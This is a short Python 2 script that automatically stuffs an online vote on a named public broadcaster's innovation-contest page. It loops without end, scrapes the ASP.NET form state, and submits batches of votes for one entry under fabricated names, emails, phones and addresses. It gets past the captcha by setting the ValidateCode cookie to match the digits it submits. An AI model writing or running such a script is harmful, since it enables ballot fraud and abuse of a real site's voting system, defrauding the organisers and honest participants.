# coding=utf-8
import urllib
import urllib2
import re
import random
import time

url = [ 'http://activity.pts.org.tw/pts/A2015InnovationVote/Vote.aspx',
        'http://activity.pts.org.tw/pts/A2015InnovationVote/ValidateCode.aspx']

count = 0
while(True):

    request = urllib2.Request(url[0])
    request.add_header('User-Agent', 'Chrome/47.0.2526.106')
    request.add_header('Cookie', 'VoteItem=VoteItems=28')
    response = urllib2.urlopen(request)
    lines = response.readlines()
    response.close()
    for line in lines:
        match = re.search('__VIEWSTATE\" value=\"(.*)\"', line)
        if match:
            __VIEWSTATE = match.group(1)
            break
    for line in lines:
        match = re.search('__EVENTVALIDATION\" value=\"(.*)\"', line)
        if match:
            __EVENTVALIDATION = match.group(1)
            break
    #print __VIEWSTATE
    #print __EVENTVALIDATION
    '''
    request = urllib2.Request(url[1])
    request.add_header('User-Agent', 'Chrome/47.0.2526.106')
    response = urllib2.urlopen(request)
    captcha = response.info().getheader('Set-Cookie')[13:17]
    '''
    for _ in range(100):
        try:
            count += 1
            captcha = str(random.randint(1000000,9999999))
            dic = {
                    '__VIEWSTATE'       :   __VIEWSTATE,
                    '__EVENTVALIDATION' :   __EVENTVALIDATION,
                    #'cbxConfirm'        :   'on',
                    'txtName'           :   captcha,
                    'txtEmail'          :   captcha+'@1001000.io',
                    'txtPhone'          :   captcha,
                    'txtAddress'        :   captcha,
                    'txt_input'         :   captcha[0:4],
                    'btn_submit'        :   '送出',
                    'VoteItem'          :   '28'
                    }
            data = urllib.urlencode(dic)
            request = urllib2.Request(url[0])
            request.add_header('User-Agent', 'Chrome/47.0.2526.106')
            request.add_header('Cookie', 'ValidateCode='+captcha[0:4])
            response = urllib2.urlopen(request, data)
            response.close()
            #print response.read()
            print count, captcha
        except:
            response.close()
            print count
            continue
    time.sleep(100)
